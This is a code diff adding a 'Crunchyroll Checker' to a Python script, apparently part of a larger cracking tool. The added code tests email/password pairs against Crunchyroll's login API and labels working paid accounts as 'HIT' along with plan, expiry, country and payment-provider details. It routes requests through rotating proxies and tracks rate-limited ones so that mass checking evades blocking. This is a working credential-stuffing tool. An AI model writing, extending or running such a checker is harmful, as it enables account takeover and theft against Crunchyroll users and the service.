@@ -1256,3 +1256,204 @@ if __name__ == "__main__":
         root.mainloop()
     else:
         print("Tkinter not available. Run this script locally with a full Python installation.")
+
+# =====================================================================
+# CRUNCHYROLL CHECKER
+# =====================================================================
+class CrunchyrollChecker:
+    def __init__(self, proxy_manager=None):
+        self.proxy_manager = proxy_manager
+        self.session = requests.Session()
+        if proxy_manager:
+            proxy = proxy_manager.get_proxy()
+            if proxy:
+                proxy_url = f"http://{proxy}"
+                self.session.proxies.update({"http": proxy_url, "https": proxy_url})
+        
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9"
+        })
+    
+    def check_account(self, email, password):
+        result = {
+            "email": email,
+            "password": password,
+            "status": "ERROR",
+            "data": {},
+            "error": "Unknown"
+        }
+        
+        try:
+            # Get access token
+            auth_data = {
+                "account": email,
+                "password": password
+            }
+            
+            auth_response = self.session.post(
+                "https://auth.crunchyroll.com/authenticate",
+                json=auth_data,
+                timeout=15,
+                verify=False
+            )
+            
+            if auth_response.status_code == 401:
+                result["status"] = "INVALID"
+                result["error"] = "Invalid credentials"
+                return result
+            
+            if auth_response.status_code != 200:
+                result["status"] = "ERROR"
+                result["error"] = f"Auth failed: {auth_response.status_code}"
+                return result
+            
+            auth_json = auth_response.json()
+            access_token = auth_json.get("access_token", "")
+            
+            if not access_token:
+                result["status"] = "INVALID"
+                result["error"] = "No access token"
+                return result
+            
+            # Get user profile
+            self.session.headers.update({
+                "Authorization": f"Bearer {access_token}"
+            })
+            
+            profile_response = self.session.get(
+                "https://www.crunchyroll.com/api/v2/profile",
+                timeout=15,
+                verify=False
+            )
+            
+            if profile_response.status_code != 200:
+                result["status"] = "ERROR"
+                result["error"] = f"Profile fetch failed: {profile_response.status_code}"
+                return result
+            
+            profile_data = profile_response.json()
+            user = profile_data.get("username", email)
+            
+            # Get subscription info
+            sub_response = self.session.get(
+                "https://www.crunchyroll.com/api/v2/subscriptions",
+                timeout=15,
+                verify=False
+            )
+            
+            if sub_response.status_code != 200:
+                result["status"] = "FREE"
+                result["error"] = "Free account"
+                result["data"] = {
+                    "user": user,
+                    "plan": "FREE",
+                    "streams": "N/A",
+                    "expires": "N/A",
+                    "renew": "N/A",
+                    "country": "N/A",
+                    "payment": "N/A",
+                    "sku": "N/A"
+                }
+                result["status"] = "BAD"
+                return result
+            
+            sub_data = sub_response.json()
+            subscriptions = sub_data.get("subscriptions", [])
+            
+            if not subscriptions:
+                result["status"] = "EXPIRED"
+                result["error"] = "No active subscription"
+                result["data"] = {
+                    "user": user,
+                    "plan": "EXPIRED",
+                    "streams": "N/A",
+                    "expires": "N/A",
+                    "renew": "N/A",
+                    "country": "N/A",
+                    "payment": "N/A",
+                    "sku": "N/A"
+                }
+                return result
+            
+            # Parse subscription details
+            active_sub = subscriptions[0] if subscriptions else {}
+            plan = active_sub.get("plan", "Unknown")
+            streams = active_sub.get("simul_streams", "N/A")
+            expires = active_sub.get("expiration_date", "N/A")
+            renew = active_sub.get("renewal_date", "N/A")
+            country = active_sub.get("country", "N/A")
+            payment = active_sub.get("payment_provider", "N/A")
+            sku = active_sub.get("sku", "N/A")
+            
+            result["status"] = "HIT"
+            result["error"] = ""
+            result["data"] = {
+                "user": user,
+                "plan": plan,
+                "streams": streams,
+                "expires": expires,
+                "renew": renew,
+                "country": country,
+                "payment": payment,
+                "sku": sku
+            }
+            return result
+            
+        except requests.exceptions.ProxyError:
+            result["status"] = "PROXY"
+            result["error"] = "Proxy error"
+            return result
+        except requests.exceptions.Timeout:
+            result["status"] = "TIMEOUT"
+            result["error"] = "Request timeout"
+            return result
+        except Exception as e:
+            result["status"] = "ERROR"
+            result["error"] = str(e)[:100]
+            return result
+
+
+def get_working_proxies(min_count=15):
+    """Fetch working proxies for Crunchyroll"""
+    pm = ProxyManager(None, service="crunchyroll")
+    pm.initial_massive_load = True
+    pm.refresh(massive=True)
+    
+    # Wait a bit for proxies to be validated
+    time.sleep(2)
+    
+    with pm.lock:
+        valid_proxies = list(pm.pool[:min_count])
+    
+    return valid_proxies if len(valid_proxies) >= 5 else []
+
+
+class SmartProxyManager:
+    """Simple proxy manager for web interface"""
+    def __init__(self, proxies):
+        self.proxies = proxies or []
+        self.index = 0
+        self.bad_proxies = set()
+    
+    def get_proxy(self):
+        if not self.proxies:
+            return None
+        
+        # Filter out bad proxies
+        good_proxies = [p for p in self.proxies if p not in self.bad_proxies]
+        if not good_proxies:
+            return None
+        
+        proxy = good_proxies[self.index % len(good_proxies)]
+        self.index += 1
+        return proxy
+    
+    def report_success(self, proxy):
+        if proxy and proxy in self.bad_proxies:
+            self.bad_proxies.discard(proxy)
+    
+    def report_rate(self, proxy, cooldown=60):
+        if proxy:
+            self.bad_proxies.add(proxy)
